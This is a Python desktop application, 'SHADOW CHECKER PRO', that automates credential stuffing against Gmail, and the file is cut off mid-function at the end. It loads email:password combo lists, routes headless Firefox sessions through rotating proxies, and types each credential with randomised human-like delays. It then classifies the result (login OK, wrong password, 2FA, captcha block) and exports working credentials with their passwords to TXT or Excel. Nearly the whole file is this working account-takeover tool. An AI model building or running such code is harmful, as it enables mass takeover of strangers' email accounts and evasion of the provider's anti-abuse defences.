"""
SHADOW CHECKER PRO — Original Full Architecture & Per-Session LiveViewer Integration
"""

import sys
import os
import threading
import queue
import json
import tempfile
import shutil
import traceback
import platform
import re
import ipaddress
import time
import uuid
from pathlib import Path
from datetime import datetime
import random

from PySide6.QtCore import QThread, Signal, QTimer, Qt, QRectF
from PySide6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QFrame,
    QVBoxLayout, QHBoxLayout, QGridLayout, QLabel, QPushButton,
    QFileDialog, QLineEdit, QSpinBox, QComboBox,
    QTableWidget, QTableWidgetItem, QHeaderView,
    QPlainTextEdit, QMessageBox, QInputDialog, QDialog, QSlider,
)

from PySide6.QtGui import QPixmap, QPainter, QColor, QFont
from playwright.sync_api import sync_playwright
import openpyxl

from integrations.proxy_runtime import ProxyRuntime
from integrations.proxy_pool import ProxyPool
from integrations.proxy_only_gui import ProxyOnlyWindow
from integrations.worker_liveviewer import LiveViewerBridge


TARGET_URL = "https://www.gmail.com"
BROWSER_IP_URL = "https://api64.ipify.org?format=json"
SESSION_HOLD_SECONDS = 90
FIREFOX_VIEWPORT = {"width": 1920, "height": 1080}
FIREFOX_WINDOW_WIDTH = 700
FIREFOX_WINDOW_HEIGHT = 530
PAGE_ZOOM = "100%"

PERSISTENT_ZOOM_SCRIPT = r"""
(() => {
  const setZoom = () => {
    if (document.documentElement) document.documentElement.style.setProperty('zoom', '100%', 'important');
  };
  setZoom();
  document.addEventListener('DOMContentLoaded', setZoom);
  window.addEventListener('pageshow', setZoom);
})();
"""


STYLE = """
QMainWindow, QWidget {
    background: #30363B;
    color: #EDF2F3;
    font: 10px 'Segoe UI';
}
QFrame#panel {
    background: #3B4349;
    border: 1px solid #5B6870;
    border-radius: 7px;
}
QLabel { background: transparent; }
QLabel#section {
    color: #DCEAF0;
    font-weight: 700;
    font-size: 11px;
}
QPushButton {
    background: #535F66;
    color: #F2F5F6;
    border: 1px solid #75838B;
    border-radius: 5px;
    padding: 3px 7px;
    min-height: 18px;
}
QPushButton:hover {
    background: #657680;
    border-color: #8CC7E8;
}
QPushButton:pressed { background: #46535A; }
QPushButton:disabled {
    background: #434B51;
    color: #9FAAB0;
    border-color: #59636A;
}
QPushButton#orange {
    background: #A6D09E;
    color: #233026;
    border: 1px solid #A6D09E;
    font-weight: 750;
    font-size: 11px;
}
QPushButton#orange:hover { background: #B7DFB0; }
QPushButton#stop {
    background: #57474A;
    color: #FFD4D0;
    border: 1px solid #997175;
    font-weight: 650;
}
QPushButton#stop:hover { background: #684F52; }
QPushButton#show {
    background: #315845;
    color: #D7F7DF;
    border: 1px solid #74B98C;
    font-weight: 650;
}
QPushButton#show:checked {
    background: #315845;
    color: #C7F0D1;
    border: 1px solid #74B98C;
    font-weight: 650;
}
QPushButton#tofile {
    background: #365C49;
    color: #D4F1DB;
    border: 1px solid #77B58C;
    font-weight: 650;
}
QPushButton#explore {
    background: #34586B;
    color: #D6F0FC;
    border: 1px solid #77B6D5;
    font-weight: 650;
}
QLineEdit, QComboBox, QSpinBox {
    background: #293137;
    color: #F0F3F4;
    border: 1px solid #75828A;
    border-radius: 5px;
    padding: 3px 6px;
    min-height: 18px;
    selection-background-color: #487F9D;
}
QLineEdit:focus, QComboBox:focus, QSpinBox:focus {
    border-color: #8CC7E8;
}
QLineEdit:disabled, QComboBox:disabled, QSpinBox:disabled {
    background: #414A50;
    color: #AAB4B9;
}
QComboBox QAbstractItemView {
    background: #303A40;
    color: #EFF3F4;
    selection-background-color: #426D84;
}
QTableWidget, QPlainTextEdit {
    background: #2C353B;
    color: #EDF2F3;
    border: 1px solid #64737B;
    border-radius: 5px;
    gridline-color: #45525A;
    selection-background-color: #3E718D;
    selection-color: #FFFFFF;
}
QTableWidget { alternate-background-color: #344047; }
QHeaderView::section {
    background: #46535B;
    color: #E7F0F3;
    border: none;
    border-bottom: 1px solid #71818A;
    padding: 4px;
    font-weight: 650;
}
QTableCornerButton::section { background: #46535B; }
QScrollBar:vertical, QScrollBar:horizontal { background: #303A40; }
QScrollBar::handle:vertical, QScrollBar::handle:horizontal {
    background: #657780;
    border-radius: 4px;
    min-height: 15px;
    min-width: 15px;
}
QToolTip {
    background: #263137;
    color: #F1F5F6;
    border: 1px solid #8CC7E8;
    padding: 3px;
}
"""


class RuntimeThread(QThread):
    result_signal = Signal(object)
    progress_signal = Signal(int, int)
    log_signal = Signal(str)

    def __init__(self, lines, proxy_pool):
        super().__init__()
        self.lines = lines
        self.runtime = ProxyRuntime(
            on_result=self.result_signal.emit,
            on_progress=self.progress_signal.emit,
            max_workers=5,
            proxy_pool=proxy_pool,
        )

    def stop(self):
        self.runtime.stop()

    def run(self):
        self.log_signal.emit("[RUNTIME] Starting HTTPS verification...")
        self.runtime.scan(self.lines)
        self.log_signal.emit("[RUNTIME] Verification finished.")


class FirefoxWorker(QThread):
    status_signal = Signal(int, str, str)
    result_signal = Signal(str, str, str, str)
    log_signal = Signal(str)

    def __init__(self, browser_id, proxy, protocol, expected_ip,
                 lease=None, direct=False, combo_queue=None):
        super().__init__()
        self.browser_id = browser_id
        self.proxy = proxy
        self.protocol = protocol
        self.expected_ip = expected_ip
        self.lease = lease
        self.direct = direct
        self.combo_queue = combo_queue
        self.stop_event = threading.Event()
        self.current_bridge = None  # مرجع للـ Live Viewer الخاص بالجلسة النشطة حالياً

    def show_viewer(self):
        """فتح الـ Live Viewer الخاص بالجلسة النشطة حالياً فقط"""
        if self.current_bridge:
            self.current_bridge.show()

    def stop(self):
        self.stop_event.set()
        if self.current_bridge:
            self.current_bridge.close()

    def run(self):
        label = f"Browser #{self.browser_id}"
        proxy_label = "DIRECT" if self.direct else self.proxy.label
        try:
            while not self.stop_event.is_set():
                if self.combo_queue is None or self.combo_queue.empty():
                    break
                try:
                    combo = self.combo_queue.get(timeout=0.5)
                except queue.Empty:
                    continue

                email, password = combo
                masked_email = email[:3] + "***" if len(email) > 3 else "***"
                self.status_signal.emit(self.browser_id, f"CHECKING {masked_email}", proxy_label)
                self.log_signal.emit(f"[{label}] Opening fresh isolated session for: {masked_email}")

                status = "UNKNOWN"
                detail = "Initialized"

                # **إنشاء LiveViewerBridge مستقل وخاص حصرياً بهذه الجلسة (Combo Session)**
                session_bridge = LiveViewerBridge(f"Browser #{self.browser_id} — {masked_email}")
                session_bridge.start()
                self.current_bridge = session_bridge

                with sync_playwright() as playwright:
                    options = {"headless": True}
                    if not self.direct:
                        if self.proxy is None or not self.protocol or self.lease is None:
                            raise RuntimeError("Proxy requires verified lease")
                        options["proxy"] = self.proxy.playwright_config(self.protocol)

                    browser = playwright.firefox.launch(**options)
                    context = None
                    try:
                        context = browser.new_context(
                            ignore_https_errors=False,
                            viewport=FIREFOX_VIEWPORT,
                            device_scale_factor=1,
                            accept_downloads=False,
                            permissions=[],
                        )
                        context.add_init_script(script=PERSISTENT_ZOOM_SCRIPT)
                        page = context.new_page()

                        response = page.goto(TARGET_URL, wait_until="domcontentloaded", timeout=30000)
                        page.wait_for_timeout(random.randint(1500, 2500))

                        # المرحلة الأولى: إدخال الإيميل
                        email_input_sel = 'input[type="email"], input#identifierId'
                        page.wait_for_selector(email_input_sel, timeout=20000)
                        page.click(email_input_sel)
                        page.wait_for_timeout(random.randint(400, 800))

                        for char in email:
                            page.type(email_input_sel, char, delay=random.randint(80, 180))
                            session_bridge.sync_screencast(page)

                        page.wait_for_timeout(800)
                        page.click('#identifierNext, button:has-text("Next")')
                        
                        hold_deadline = time.monotonic() + 4.0
                        while time.monotonic() < hold_deadline and not self.stop_event.is_set():
                            session_bridge.sync_screencast(page)
                            page.wait_for_timeout(100)

                        body_text = page.locator("body").inner_text().lower()
                        page_url = page.url.lower()

                        if any(w in body_text for w in ["couldn't find your google account", "aucun compte", "introuvable"]):
                            status = "ACCOUNT NOT FOUND"
                            detail = "Email does not exist"
                        elif any(w in body_text for w in ["captcha", "unusual traffic", "verify that it's you"]):
                            status = "SECURITY BLOCK"
                            detail = "Captcha / Unusual Traffic detected on email stage"
                        else:
                            # المرحلة الثانية: إدخال كلمة المرور
                            pwd_input_sel = 'input[type="password"], input[name="Passwd"]'
                            try:
                                page.wait_for_selector(pwd_input_sel, timeout=15000)
                                page.click(pwd_input_sel)
                                page.wait_for_timeout(random.randint(500, 1000))

                                for char in password:
                                    page.type(pwd_input_sel, char, delay=random.randint(90, 200))
                                    session_bridge.sync_screencast(page)

                                page.wait_for_timeout(800)
                                page.click('#passwordNext, button:has-text("Next")')
                                
                                hold_deadline = time.monotonic() + 6.0
                                while time.monotonic() < hold_deadline and not self.stop_event.is_set():
                                    session_bridge.sync_screencast(page)
                                    page.wait_for_timeout(100)

                                pwd_body = page.locator("body").inner_text().lower()
                                pwd_url = page.url.lower()

                                if any(w in pwd_body for w in ["password was changed", "تم تغيير كلمة المرور"]):
                                    status = "PASSWORD CHANGED"
                                    detail = "Password has been modified"
                                elif any(w in pwd_body for w in ["wrong password", "incorrect password", "كلمة المرور غير صحيحة", "try again"]):
                                    status = "PASSWORD WRONG"
                                    detail = "Incorrect password entered"
                                elif any(w in pwd_body for w in ["has been disabled", "disabled by your"]):
                                    status = "ACCOUNT DISABLED"
                                    detail = "Google Workspace / Gmail Account suspended"
                                elif any(w in pwd_body for w in ["phone number", "recoveryphone"]) or "recoveryphone" in pwd_url:
                                    status = "PHONE VERIFIED"
                                    detail = "Phone verification challenge requested"
                                elif any(w in pwd_body for w in ["authenticator", "2-step verification", "prompt"]) or "signin/challenge" in pwd_url:
                                    status = "2FA"
                                    detail = "Two-Factor Authentication required"
                                elif any(w in pwd_body for w in ["captcha", "unusual traffic"]):
                                    status = "SECURITY BLOCK"
                                    detail = "Security check / Captcha on password stage"
                                elif any(w in pwd_url for w in ["myaccount.google.com", "mail.google.com", "landing", "signinoptions"]):
                                    status = "LOGIN OK"
                                    detail = "Successfully authenticated and reached inbox/dashboard"
                                else:
                                    status = "LOGIN OK"
                                    detail = "Reached post-login state successfully"
                            except Exception as pwd_exc:
                                status = "SECURITY BLOCK"
                                detail = f"Password stage timeout/security wall: {type(pwd_exc).__name__}"

                    except Exception as exc:
                        status = "ERROR"
                        detail = f"Execution exception: {type(exc).__name__}"
                    finally:
                        # **إغلاق وتدمير الـ Live Viewer والـ Context معاً فوراً وبشكل تلقائي بمجرد انتهاء الإيميل**
                        try:
                            session_bridge.stop_screencast(page)
                        except Exception:
                            pass
                        try:
                            session_bridge.close()  # <-- إغلاق نافذة الـ Viewer تلقائياً
                        except Exception:
                            pass

                        if context is not None:
                            try:
                                context.close()
                            except Exception:
                                pass
                        if browser is not None:
                            try:
                                browser.close()
                            except Exception:
                                pass

                    self.result_signal.emit(email, password, status, detail)
                    self.log_signal.emit(f"[{label}] Result for {masked_email} -> {status} [{detail}]")
                    self.combo_queue.task_done()

        except Exception as exc:
            safe = str(exc)
            if self.proxy is not None:
                for secret in (self.proxy.username, self.proxy.password):
                    if secret:
                        safe = safe.replace(secret, "***")
            self.status_signal.emit(self.browser_id, "ERROR", proxy_label)
            self.result_signal.emit(label, "Gmail", "ERROR", type(exc).__name__)
            self.log_signal.emit(f"[{label}] {type(exc).__name__}: {safe[:160]}")
        finally:
            if self.current_bridge:
                self.current_bridge.close()


class CheckerWindow(QMainWindow):

    def __init__(self):
        super().__init__()

        self.setWindowTitle(
            "SHADOW CHECKER PRO — Per-Session LiveViewer Integration"
        )

        self.resize(920, 610)
        self.setMinimumSize(820, 550)
        self.setStyleSheet(STYLE)

        self.proxies = []
        self.results = []
        self.workers = []
        self.runtime_thread = None
        self.proxy_monitor = None
        self.runtime_history = []
        self.runtime_last_progress = (0, 0)
        self.runtime_scan_done = False
        self.stopping = False
        self.direct_mode = False

        self.proxy_pool = ProxyPool()
        self.combo_queue = queue.Queue()

        self.browser_status = []
        self.browser_show_buttons = []
        self.last_export_path = None
        self._export_session_token = None
        self._export_path = None
        self._browser_buttons = {}

        self.loaded_count = 0
        self.checked_count = 0
        self.good_count = 0
        self.bad_count = 0

        self._diagnostic_dir = tempfile.TemporaryDirectory(prefix="shadow_checker_diag_")
        self._diag_path = Path(self._diagnostic_dir.name)
        self._diag_jsonl = self._diag_path / "diagnostics.jsonl"
        self._diag_txt = self._diag_path / "diagnostics.txt"
        self._diag_count = 0
        self._diag_secrets = set()
        self.build_ui()
        self.diagnostic("system", "startup", python=sys.version.split()[0],
                        os=platform.platform(), target=TARGET_URL)
        self.log("Proxy Runtime ready. Per-Session LiveViewer integration enabled.")

    def panel(self, layout=None):
        panel = QFrame(objectName="panel")
        panel.setLayout(layout or QVBoxLayout())
        return panel

    def _sanitize(self, value):
        text = str(value)
        for secret in sorted(self._diag_secrets, key=len, reverse=True):
            if secret:
                text = text.replace(secret, "[REDACTED]")
        text = re.sub(r"(https?://|socks5h?://)([^/@\s]+)@", r"\1[REDACTED]@", text)
        return text

    def diagnostic(self, component, event, **fields):
        try:
            entry = {"time": datetime.now().astimezone().isoformat(timespec="milliseconds"),
                     "component": component, "event": event,
                     "data": {str(k): self._sanitize(v) for k, v in fields.items()}}
            with self._diag_jsonl.open("a", encoding="utf-8") as f:
                f.write(json.dumps(entry, ensure_ascii=False) + "\n")
            with self._diag_txt.open("a", encoding="utf-8") as f:
                f.write(f"{entry['time']} [{component}] {event} "
                        + json.dumps(entry["data"], ensure_ascii=False) + "\n")
            self._diag_count += 1
        except OSError:
            pass

    def export_diagnostics(self):
        dest, _ = QFileDialog.getSaveFileName(
            self, "Export diagnostics (explicit copy)",
            str(Path.home() / "Desktop" / "shadow_diagnostics.jsonl"),
            "JSON Lines (*.jsonl);;Text (*.txt)")
        if not dest:
            return
        source = self._diag_txt if dest.lower().endswith(".txt") else self._diag_jsonl
        try:
            shutil.copyfile(source, dest)
            self.log("[DIAGNOSTIC] Exported to: " + dest)
        except OSError as exc:
            QMessageBox.warning(self, "Export failed", str(exc))

    def show_diagnostics(self):
        dialog = QMessageBox(self)
        dialog.setWindowTitle("Diagnostic Logs")
        dialog.setText(f"Temporary diagnostic events: {self._diag_count}\n"
                       "Automatically deleted on normal program exit.\n"
                       "Use Export to keep a copy for analysis.")
        export_button = dialog.addButton("Export JSONL / TXT", QMessageBox.ButtonRole.ActionRole)
        open_button = dialog.addButton("Open temporary folder", QMessageBox.ButtonRole.ActionRole)
        dialog.addButton("Close", QMessageBox.ButtonRole.RejectRole)
        dialog.exec()
        if dialog.clickedButton() == export_button:
            self.export_diagnostics()
        elif dialog.clickedButton() == open_button:
            if sys.platform == "win32":
                os.startfile(str(self._diag_path))
            else:
                self.log("[DIAGNOSTIC] " + str(self._diag_path))

    def log(self, message):
        self.diagnostic("checker", "log", message=message)
        self.logs.appendPlainText(
            f"[{datetime.now():%H:%M:%S}]  {message}"
        )

    def build_ui(self):
        root = QWidget()
        self.setCentralWidget(root)

        v = QVBoxLayout(root)
        v.setContentsMargins(9, 8, 9, 8)
        v.setSpacing(5)

        toolbar = QHBoxLayout()
        toolbar.setSpacing(5)

        for name, function in [
            ("■  Stop", self.stop),
            ("⟳  Restart", self.restart),
            ("▤  To File", self.open_file),
            ("◎  Proxy Runtime", self.open_proxy_monitor),
            ("▤  Diagnostic Logs", self.show_diagnostics),
        ]:
            button = QPushButton(name)
            button.setMinimumWidth(105)

            if name.startswith("■"):
                button.setObjectName("stop")

            if "To File" in name:
                button.setObjectName("tofile")

            button.clicked.connect(function)
            toolbar.addWidget(button)

        toolbar.addStretch()
        v.addLayout(toolbar)

        for title, attribute, function in [
            ("▤   Source File", "source_path", self.browse_source),
            ("▤   Proxy File", "proxy_path", self.browse_proxy),
        ]:
            row = QHBoxLayout()
            row.setSpacing(5)

            label = QLabel(title)
            label.setFixedWidth(112)
            row.addWidget(label)

            edit = QLineEdit()
            if attribute == "source_path":
                edit.setPlaceholderText("Select source combo file (email:password)...")
            else:
                edit.setPlaceholderText("Select a local text file...")

            setattr(self, attribute, edit)
            row.addWidget(edit, 1)

            button = QPushButton("▱  Explore")
            button.setObjectName("explore")
            button.setFixedWidth(84)
            button.clicked.connect(function)
            row.addWidget(button)

            v.addLayout(row)

        settings = QHBoxLayout()
        settings.setSpacing(6)

        settings.addWidget(
            QLabel("Proxy Protocol")
        )

        self.proxy_type = QComboBox()
        self.proxy_type.addItems([
            "AUTO DETECT",
        ])

        settings.addWidget(self.proxy_type)
        settings.addSpacing(8)

        settings.addWidget(QLabel("Threads"))

        self.threads = QSpinBox()
        self.threads.setRange(1, 10)
        self.threads.setValue(3)

        self.threads.valueChanged.connect(
            self.browser_cards
        )

        settings.addWidget(self.threads)
        settings.addSpacing(8)

        settings.addWidget(QLabel("Export Mode"))

        self.mode = QComboBox()
        self.mode.addItems([
            "TXT",
            "Excel (.xlsx)",
        ])

        settings.addWidget(self.mode)
        settings.addStretch()

        self.start_btn = QPushButton("▶  START")
        self.start_btn.setObjectName("orange")
        self.start_btn.setMinimumWidth(112)
        self.start_btn.clicked.connect(self.start)

        settings.addWidget(self.start_btn)
        v.addLayout(settings)

        counter = QHBoxLayout()
        counter.setSpacing(5)

        self.loaded_label = QLabel("Loaded: 0")
        self.working_label = QLabel("Valid: 0")
        self.bad_label = QLabel("Invalid: 0")
        self.type_label = QLabel("Protocol: AUTO")

        for widget in [
            QLabel("▤   Proxy Counter"),
            self.loaded_label,
            self.working_label,
            self.bad_label,
            self.type_label,
        ]:
            counter.addWidget(widget)
            counter.addStretch()

        v.addWidget(self.panel(counter))

        pool_row = QHBoxLayout()
        pool_row.setSpacing(5)

        self.pool_label = QLabel(
            "Proxy Pool: 0 READY"
        )

        self.progress_label = QLabel(
            "Runtime: IDLE"
        )

        pool_row.addWidget(self.pool_label)
        pool_row.addStretch()
        pool_row.addWidget(self.progress_label)

        v.addWidget(self.panel(pool_row))

        browser_box = QVBoxLayout()
        browser_box.setContentsMargins(7, 6, 7, 6)
        browser_box.setSpacing(5)

        browser_box.addWidget(
            QLabel(
                "◎   Live Browsers",
                objectName="section",
            )
        )

        self.browser_row = QGridLayout()
        self.browser_row.setHorizontalSpacing(5)
        self.browser_row.setVerticalSpacing(5)
        browser_box.addLayout(self.browser_row)

        v.addWidget(self.panel(browser_box))
        self.browser_cards(self.threads.value())

        stats_row = QHBoxLayout()
        stats_row.setSpacing(6)
        self.stats = {}

        for key in [
            "Total", "OK", "Bad",
            "Captcha", "Retry", "Errors", "RPM",
        ]:
            label = QLabel(f"{key}: 0")
            self.stats[key] = label
            stats_row.addWidget(label)

        v.addWidget(self.panel(stats_row))

        panes = QHBoxLayout()
        panes.setSpacing(6)

        for title, is_results in [
            ("▤   Results", True),
            ("▤   Logs", False),
        ]:
            column = QVBoxLayout()
            column.setContentsMargins(7, 6, 7, 6)

            header = QHBoxLayout()
            header.addWidget(
                QLabel(
                    title,
                    objectName="section",
                )
            )
            header.addStretch()

            clear = QPushButton("♧  Clear")
            header.addWidget(clear)
            column.addLayout(header)

            if is_results:
                self.table = QTableWidget(0, 4)

                self.table.setHorizontalHeaderLabels([
                    "Session",
                    "Password",
                    "Status",
                    "Details",
                ])

                self.table.verticalHeader().setVisible(
                    True
                )

                self.table.verticalHeader().setDefaultSectionSize(
                    22
                )

                self.table.horizontalHeader().setSectionResizeMode(
                    QHeaderView.ResizeMode.Stretch
                )

                self.table.setEditTriggers(
                    QTableWidget.EditTrigger.NoEditTriggers
                )
                self.table.setAlternatingRowColors(True)

                column.addWidget(self.table)

                clear.clicked.connect(
                    self.clear_results
                )

            else:
                self.logs = QPlainTextEdit()
                self.logs.setReadOnly(True)
                self.logs.setMaximumBlockCount(1000)

                column.addWidget(self.logs)

                clear.clicked.connect(
                    self.logs.clear
                )

            panes.addWidget(
                self.panel(column),
                1,
            )

        v.addLayout(panes, 1)

    def open_proxy_monitor(self):
        if self.proxy_monitor is None:
            self.proxy_monitor = ProxyOnlyWindow(self)
            self.proxy_monitor.reset(self.runtime_last_progress[1])
            for result in self.runtime_history:
                self.proxy_monitor.add_result(result)
            self.proxy_monitor.set_progress(*self.runtime_last_progress)
            if self.runtime_scan_done:
                self.proxy_monitor.mark_finished()
        self.proxy_monitor.show()
        self.proxy_monitor.raise_()
        self.proxy_monitor.activateWindow()

    def browser_cards(self, count):
        while self.browser_row.count():
            item = self.browser_row.takeAt(0)
            if item.widget():
                item.widget().deleteLater()

        self.browser_status = []
        self.browser_show_buttons = []
        self._browser_buttons = {}
        self._browser_cards = {}

        for index in range(count):
            browser_id = index + 1
            inner = QVBoxLayout()
            inner.setContentsMargins(6, 5, 6, 5)
            inner.setSpacing(3)

            top = QHBoxLayout()
            top.addWidget(QLabel(f"🌐  Browser #{browser_id}", objectName="section"))
            top.addStretch()

            show_btn = QPushButton("Show")
            show_btn.setObjectName("show")
            show_btn.setCheckable(False)
            show_btn.setFixedWidth(48)
            show_btn.setToolTip("Open independent Live Viewer for this browser session")
            show_btn.clicked.connect(
                lambda checked=False, bid=browser_id: self.toggle_browser_window(bid)
            )
            top.addWidget(show_btn)
            inner.addLayout(top)

            location = QLabel("⌖  Proxy: Waiting")
            status = QLabel("Status: WAITING")
            location.setWordWrap(True)
            status.setWordWrap(True)
            inner.addWidget(location)
            inner.addWidget(status)

            card = self.panel(inner)
            card.setMinimumWidth(132)
            card.setMaximumWidth(260)
            self.browser_row.addWidget(card, index // 5, index % 5)
            self._browser_cards[browser_id] = card

            self.browser_status.append((location, status))
            self.browser_show_buttons.append(show_btn)
            self._browser_buttons[browser_id] = show_btn

    def toggle_browser_window(self, browser_id):
        worker = next((w for w in self.workers if w.browser_id == browser_id), None)
        if worker is None:
            self.log(f"[PREVIEW #{browser_id}] No active session")
            return
        worker.show_viewer()

    def browse_source(self):
        path, _ = QFileDialog.getOpenFileName(
            self,
            "Choose source file",
            "",
            "Text files (*.txt *.csv);;All files (*)",
        )

        if path:
            self.source_path.setText(path)
            self.load_source_combos(path)

    def load_source_combos(self, path_str):
        path = Path(path_str)
        if not path.is_file():
            return
        lines = path.read_text(encoding="utf-8-sig", errors="replace").splitlines()
        valid_count = 0
        for line in lines:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if ":" in line:
                parts = line.split(":", 1)
                email, password = parts[0].strip(), parts[1].strip()
                if email and password:
                    self.combo_queue.put((email, password))
                    valid_count += 1
        self.log(f"Loaded {valid_count} combos from source file.")
        self.loaded_label.setText(f"Loaded: {valid_count}")

    def browse_proxy(self):
        path, _ = QFileDialog.getOpenFileName(
            self,
            "Choose proxy list",
            "",
            "Text files (*.txt *.csv);;All files (*)",
        )

        if path:
            self.proxy_path.setText(path)
            self.load_proxies()

    def load_proxies(self):
        path = Path(
            self.proxy_path.text().strip()
        )

        if not path.is_file():
            self.log("Proxy file not found.")
            return []

        lines = path.read_text(
            encoding="utf-8-sig",
            errors="replace",
        ).splitlines()

        lines = [
            line.strip()
            for line in lines
            if line.strip()
            and not line.lstrip().startswith("#")
        ]

        self.loaded_count = len(lines)
        self.loaded_label.setText(f"Loaded: {len(lines)}")
        self.log(f"Loaded {len(lines)} proxy entries.")
        return lines

    def start(self):
        if self.combo_queue.empty():
            source_file = self.source_path.text().strip()
            if source_file and Path(source_file).is_file():
                self.load_source_combos(source_file)
            if self.combo_queue.empty():
                QMessageBox.warning(self, "Source File", "Please select a valid source file containing email:password combos.")
                return

        if self.runtime_thread and self.runtime_thread.isRunning():
            return

        if any(worker.isRunning() for worker in self.workers):
            return

        proxy_path_text = self.proxy_path.text().strip()
        self.direct_mode = not bool(proxy_path_text)
        if self.direct_mode:
            answer = QMessageBox.question(
                self,
                "Continue without proxy?",
                "Are you sure you want to continue without proxy?\n\n"
                "Firefox will use this computer's normal network connection.",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                QMessageBox.StandardButton.No,
            )
            if answer != QMessageBox.StandardButton.Yes:
                self.log("[DIRECT] Cancelled by user.")
                return
            lines = []
        else:
            if not Path(proxy_path_text).is_file():
                QMessageBox.warning(self, "Proxy File", "Selected proxy file does not exist.")
                return
            lines = self.load_proxies()
            if not lines:
                QMessageBox.warning(self, "Proxy File", "The selected proxy file is empty.")
                return

        self.results = []
        self.table.setRowCount(0)
        self.last_export_path = None
        self._export_path = None
        self._export_session_token = (
            datetime.now().strftime("%Y%m%d_%H%M%S_%f") + "_" + uuid.uuid4().hex[:8]
        )
        self.threads.setEnabled(False)

        self.proxy_pool.close()
        self.proxy_pool = ProxyPool()

        self.checked_count = 0
        self.good_count = 0
        self.bad_count = 0
        self.runtime_history = []
        self.runtime_last_progress = (0, len(lines))
        self.runtime_scan_done = False
        self.stopping = False
        if self.proxy_monitor is not None:
            self.proxy_monitor.reset(len(lines))

        self.update_counters()
        self.start_btn.setEnabled(False)

        for index in range(len(self.browser_status)):
            self.update_browser_status(index + 1, "WAITING", "No proxy assigned")

        if self.direct_mode:
            self.runtime_scan_done = True
            self.progress_label.setText("Runtime: SKIPPED (DIRECT)")
            self.type_label.setText("Protocol: DIRECT")
            self.log("[DIRECT] User confirmed normal network connection.")
            self.start_browser_sessions()
            return

        self.type_label.setText("Protocol: AUTO")
        self.runtime_thread = RuntimeThread(lines, self.proxy_pool)
        self.runtime_thread.result_signal.connect(self.runtime_result)
        self.runtime_thread.progress_signal.connect(self.runtime_progress)
        self.runtime_thread.log_signal.connect(self.log)
        self.runtime_thread.finished.connect(self.runtime_finished)
        self.runtime_thread.start()

        self.log("[CHECKER] Runtime started. Browsers remain in WAITING.")

    def runtime_result(self, result):
        self.runtime_history.append(result.copy())
        proxy_for_diag = result.get("proxy")
        if proxy_for_diag:
            for field in ("username", "password"):
                secret = getattr(proxy_for_diag, field, "")
                if secret:
                    self._diag_secrets.add(secret)
        self.diagnostic("proxy_runtime", "verification_result",
                        line=result.get("line", ""),
                        proxy=getattr(proxy_for_diag, "label", "unknown"),
                        status=result.get("status", ""),
                        protocol=result.get("protocol", ""),
                        exit_ip=result.get("exit_ip", ""),
                        reason=result.get("reason", ""))
        if self.proxy_monitor is not None:
            self.proxy_monitor.add_result(result)
        self.checked_count += 1

        status = result["status"]
        proxy = result.get("proxy")

        if status == "GOOD" and proxy:
            self.good_count += 1
            self.start_browser_sessions()
        elif status in ("BAD", "AUTH_FAILED"):
            self.bad_count += 1

        self.update_counters()

    def runtime_progress(self, completed, total):
        self.runtime_last_progress = (completed, total)
        self.diagnostic("proxy_runtime", "progress", completed=completed, total=total)
        if self.proxy_monitor is not None:
            self.proxy_monitor.set_progress(completed, total)
        self.progress_label.setText(f"Runtime: {completed}/{total}")

    def runtime_finished(self):
        self.runtime_scan_done = True
        self.diagnostic("proxy_runtime", "scan_finished", good=self.good_count,
                        bad=self.bad_count, checked=self.checked_count)
        if self.proxy_monitor is not None:
            self.proxy_monitor.mark_finished()
        self.log("[RUNTIME] Proxy verification finished. See Proxy Runtime for details.")
        self.progress_label.setText("Runtime: COMPLETE")
        self.start_browser_sessions()
        if not self.workers and (self.stopping or self.good_count == 0):
            self.start_btn.setEnabled(True)
            self.threads.setEnabled(True)

    def start_browser_sessions(self):
        if self.stopping:
            return
        capacity = self.threads.value()
        used_ids = {w.browser_id for w in self.workers}
        for browser_id in range(1, capacity + 1):
            if browser_id in used_ids:
                continue
            if self.direct_mode:
                lease = None
                worker = FirefoxWorker(browser_id, None, "DIRECT",
                                       "Not verified", direct=True, combo_queue=self.combo_queue)
            else:
                lease = self.proxy_pool.acquire(f"browser-{browser_id}", timeout=0)
                if lease is None:
                    continue
                worker = FirefoxWorker(browser_id, lease.proxy, lease.protocol,
                                       lease.exit_ip, lease=lease, combo_queue=self.combo_queue)
            worker.status_signal.connect(self.update_browser_status)
            worker.result_signal.connect(self.handle_result)
            worker.log_signal.connect(self.log)
            worker.finished.connect(lambda w=worker: self.worker_finished(w))
            self.workers.append(worker)
            used_ids.add(browser_id)

            card = self._browser_cards.get(browser_id)
            if card is not None:
                card.show()
            worker.start()
        self.update_counters()

    def update_browser_status(self, browser_id, status, proxy_info):
        index = browser_id - 1
        if 0 <= index < len(self.browser_status):
            location, status_label = self.browser_status[index]
            location.setText(f"⌖ Proxy: {proxy_info[:28]}")
            status_label.setText(f"Status: {status}")

    def handle_result(self, session, website, status, detail):
        record = (session, website, status, detail)
        self.results.append(record)
        self.diagnostic("firefox", "navigation_result", session=session,
                        website=website, status=status, detail=detail)

        row = self.table.rowCount()
        self.table.insertRow(row)

        for column, value in enumerate(record):
            self.table.setItem(row, column, QTableWidgetItem(str(value)))

        self.refresh_stats()
        self.last_export_path = self.export_to_file(self.results)

    def update_counters(self):
        self.working_label.setText(f"Valid: {self.good_count}")
        self.bad_label.setText(f"Invalid: {self.bad_count}")
        self.pool_label.setText(
            ("Proxy Pool: BYPASSED (DIRECT)" if self.direct_mode
             else f"Proxy Pool: {self.proxy_pool.stats()['available']} READY")
        )
        self.refresh_stats()

    def refresh_stats(self):
        total = len(self.results)
        ok = sum(row[2] == "LOGIN OK" for row in self.results)
        bad = sum(row[2] in ("PASSWORD WRONG", "ACCOUNT NOT FOUND") for row in self.results)
        errors = sum(row[2] in ("ERROR", "NAVIGATION_ERROR") for row in self.results)

        values = [
            ("Total", total),
            ("OK", ok),
            ("Bad", bad),
            ("Captcha", 0),
            ("Retry", 0),
            ("Errors", errors),
            ("RPM", 0),
        ]

        for key, value in values:
            self.stats[key].setText(f"{key}: {value}")

    def worker_finished(self, worker):
        if worker.lease is not None:
            self.proxy_pool.release(worker.lease)
        if worker in self.workers:
            self.workers.remove(worker)

        self.update_browser_status(worker.browser_id, "RECYCLING", "Waiting for next proxy")
        card = self._browser_cards.get(worker.browser_id)
        if card is not None:
            card.hide()
        self.log(f"[Browser #{worker.browser_id}] Session finished; refreshing slot.")

        if not self.stopping and not self.combo_queue.empty():
            QTimer.singleShot(1500, self.start_browser_sessions)

        if self.combo_queue.empty() and not self.workers:
